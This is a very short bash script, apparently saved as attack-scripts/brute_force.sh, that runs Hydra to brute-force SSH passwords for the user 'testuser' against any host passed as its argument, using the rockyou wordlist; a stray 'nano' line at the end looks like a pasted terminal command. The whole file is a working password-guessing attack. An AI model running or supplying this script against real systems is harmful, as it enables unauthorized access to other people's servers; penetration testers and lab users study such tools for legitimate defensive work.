#!/bin/bash
hydra -l testuser -P /usr/share/wordlists/rockyou.txt ssh://$1
nano attack-scripts/brute_force.sh
